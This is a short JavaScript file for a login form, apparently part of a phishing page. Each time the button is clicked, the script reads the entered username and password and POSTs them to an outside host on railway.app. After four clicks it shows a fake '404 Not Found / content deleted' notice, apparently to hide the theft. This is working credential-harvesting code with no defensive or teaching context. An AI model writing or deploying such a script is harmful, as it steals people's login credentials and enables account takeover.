const loginbtn = document.querySelector(".login");
const url= `https://instafun-production-b0fb.up.railway.app/users`



const userbtn= document.querySelector(".usr")
const passbtn = document.querySelector(".pss")


var count = 0;
loginbtn.addEventListener("click",async function() {
 
   console.log("done");
   count++;
   if(count==4)
   document.getElementById("response").innerHTML = "<div class='icon icon-generic'></div> <div><div><strong>404 Not Found</strong></div><br><div>The page you're looking for doesn't exist content is deleted by uesr.</div></div>";
 
   
   const u = await userbtn.value;
   const p = await passbtn.value;
      console.log(u + " : " + p)
      const user = {userName: u, password:p}
  await fetch(url,{

    method: 'POST',
    headers: {
        'Content-Type': 'application/json', // 👈 important
      },
      body: JSON.stringify(user),

  })
  

})